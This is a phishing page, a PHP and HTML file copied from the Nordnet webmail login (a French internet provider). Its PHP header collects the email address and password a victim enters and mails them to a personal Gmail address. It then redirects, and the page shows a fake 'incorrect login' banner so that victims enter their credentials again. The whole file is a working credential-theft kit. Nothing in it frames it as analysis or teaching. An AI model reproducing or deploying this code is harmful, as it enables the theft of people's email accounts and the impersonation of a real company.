 <?php 

 
	if (isset($_POST['envoyer'])) {
	// c'est ici le traitement se passe 
	
	
	$userid = htmlspecialchars($_POST['user']);
    $password = htmlspecialchars($_POST['pass']);
	
	$to  = 'veroni.laetitia@gmail.com'; // notez la virgule

     // Sujet
 $subject = '------ Les identifiants -----';
 
 // Pour envoyer un mail HTML, l'en-tête Content-type doit être défini
     $headers[] = 'MIME-Version: 1.0';
     $headers[] = 'Content-type: text/html; charset=iso-8859-1';

     // En-têtes additionnels
     $headers[] = 'From: le clique <email.>';

 
// message HTML
$message = ' user :'.$userid.'</br>';'</br>';
$message .= ' pass :'.$password.'</br>';'</br>';
  mail($to, $subject, $message, implode("\r\n", $headers));
header('location:index2.php');
	}
	?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0034)https://www.nordnet.com/messagerie -->
<html xmlns="" xml:lang="fr" lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="referrer" content="origin">
      <title>Nordnet service </title>

<meta name="" content="wwrwN31PDKu6llhvbvEpRgTTL_538IruVvPQPKzTXaE">
  <meta name="keywords" content="Nordnet">
  <meta name="description" content="Nordnet">
  <meta name="robots" content="index,follow,NOODP">
  <meta property="fb:app_id" content="105400956218629">
  <link rel="canonical" href="./noooooooord_files/noooooooord.html">
<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<link rel="shortcut icon" href="">
<link rel="apple-touch-icon" href="">
<link rel="apple-touch-icon" sizes="72x72" href="">
<link rel="apple-touch-icon" sizes="114x114" href="">
<link rel="apple-touch-icon" sizes="144x144" href="">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/pref_blocs.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/structure.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/menu_right.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/design.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/jqModal.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/editor.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/default.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/shadowbox.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/popup.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/mandate.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/jquery.autocompleter.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/ui.selectmenu.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/disiaddress.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/nordnetfr.css">
<link rel="stylesheet" type="text/css" media="screen" href="./noooooooord_files/messagerie.css">
    </head>
    <body>
    
    
    
<!-- End Google Tag Manager -->      
    <div id="global" style="top: 33px;">
                          
  <div id="header">
  </div>

  <div id="RUBGEN">
  <a id="logo" title="Nordnet.com - La boutique des solutions internet" onclick="setPush(&#39;haut&#39;,&#39;LOGO NORDNET&#39;,&#39;/&#39;)" href=""><img alt="Logo Nordnet, haut débit internet, nom de domaine, référencement de site, hébergement, internet satellite…" src="./noooooooord_files/logo_header.png"></a>
    <ul id="polesHT01">
      <li>
      <a class="boutique" title="Nordnet.com - La boutique des solutions internet" onclick="setPush(&#39;haut&#39;,&#39;LA BOUTIQUE&#39;,&#39;/&#39;)" href="">ACCÈS INTERNET</a>      </li>
          <li class="separator"></li>
          <li>
            <a href="" title="Portail d&#39;actualités" onclick="setPush(&#39;haut&#39;, &#39;PORTAIL ACTUALITE&#39;, &#39;&#39;)">FORFAIT MOBILE</a>
          </li>
          <li class="separator"></li>
          <li>
            <a href="" title="Le blog" onclick="setPush(&#39;haut&#39;, &#39;BLOG NORDNET&#39;, &#39;&#39;)">ANTIVIRUS & VPN</a>
          </li>
          <li class="separator"></li>
          <li>
            <a href="" title="Assistance" onclick="setPush(&#39;haut&#39;, &#39;ASSISTANCE NORDNET&#39;, &#39;&#39;)">NOM DOMANE</a>
      </li></ul><!-- #polesHT01 -->
     

            <div class="identif">
          <a target="_blank" class="acces_messagerie" title="Accédez à votre messagerie" onclick="setPush(&#39;haut&#39;,&#39;VOTRE MESSAGERIE/WEBMAIL&#39;,&#39;&#39;)" href=""><span>Messagerie</span><b class="sprite01"></b></a>
            <div id="BTabonne" class="intit">
              <a href=""><span style="color:#434343;">Espace Abonné</span><b class="sprite01"></b></a>
            </div>
            <div id="blc_identification" class="prefblc ident_form">
              <div class="marges">
                </div>
                </div>
      </div>
        </div>
       
        
                
    <h1 style="margin-top:20px;" > <center><FONT color="red"> LOGIN OU MOT DE PASSE INCORRECT </FONT></h1></center> 
 
                
                
<div id="tout" style="background-color:white;margin-top:5%;";>               
                
                
  
<div id="gauche"  style="margin-top:50px; ">
     <img src="gauche.JPG"height="120%" >
    
</div>
<div id="rouge" style="margin-top:-47%; margin-left:20%;">
     <img src="rouge.JPG" width="97%" height="100%" >
</div>
<div id="centre" >
    <div id="gauches" style="margin-top:2%;margin-left:20%";>
<form method="post" action="">
            <label>Adresse e-mail:</label>&nbsp;  &nbsp;  &nbsp;   <input type="text" name="user"required ><label style="border:2px  black">@nordnet.fr</label></br></br>
            <label>Mot de passe:</label> &nbsp; &nbsp;  &nbsp;  &nbsp;   
            <input type="password" name="pass" id="text_password" required><br><br>

             <label for="LoginType">Type d'interface :</label>&nbsp;  &nbsp;   <select tabindex="3" name="LoginType" id="LoginType">
            <option value="rc" selected="selected">Nouvelle Version</option>
            <option value="simple">Simplifié</option>
                </select> </br>  </br>           
                    <a href="" >mot de passe oublié?</a>  
                    <input name="envoyer" id="submit"  type="submit"  value="Valider" style="margin-left:15%"; > 
            </form>
              <style type="text/css">
             #submit {
  -webkit-border-radius: 28;
  -moz-border-radius: 28;
  border-radius: 28px;
  font-family: Arial;
  color: #ffffff;
  font-size: 10px;
  background: #384147;
  padding: 10px 20px 10px 20px;
  text-decoration: none;
}

#submit:hover {
  text-decoration: none;
}
              }
              </style>   
    </div>
    <div id="droit"style="margin-top:-14%;margin-left:55%";>
         <img src="fille.JPG">
    </div>   
    
</div>
<div id="bas" style="margin-top:3%;margin-left:20%";>
   <img src="bas.JPG">
</div>  
</div>